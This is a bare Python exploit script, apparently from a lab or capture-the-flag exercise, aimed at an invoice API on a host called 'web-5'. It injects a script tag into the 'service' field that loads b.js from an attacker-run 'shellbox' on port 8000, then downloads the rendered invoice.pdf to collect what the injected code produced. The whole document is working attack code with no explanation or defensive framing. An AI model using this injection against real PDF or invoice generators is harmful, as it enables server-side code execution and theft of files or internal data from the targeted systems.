#!/bin/env python3

import requests

headers = {
    "Host": "web-5",
    "Accept": "application/json, text/javascript, */*; q=0.01",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate",
    "Content-Type": "application/json",
    "X-Requested-With": "XMLHttpRequest",
    "Content-Length": "173",
    "Origin": "http://web-5",
    "Connection": "close",
    "Referer": "http://web-5/sample-page.html",
}

# Host the b.js script on the shellbox, and serve it on port 8000
data = '{"companyName":"a","service":"<script src=//shellbox:8000/b.js></script>","description":"a","priceCents":1,"quantity":1,"total":1,"tax":1,"grandTotal":1}'

response = requests.post(
    "http://web-5/api", headers=headers, data=data, verify=False
)

if response.json()["result"] == "success":
    headers = {
        "Host": "web-5",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5",
        "Accept-Encoding": "gzip, deflate",
        "Connection": "close",
        "Upgrade-Insecure-Requests": "1",
        "Pragma": "no-cache",
        "Cache-Control": "no-cache",
    }

    response = requests.get(
        "http://web-5/output/invoice.pdf", headers=headers, verify=False
    )

    with open("invoice.pdf", "wb") as f:
        f.write(response.content)
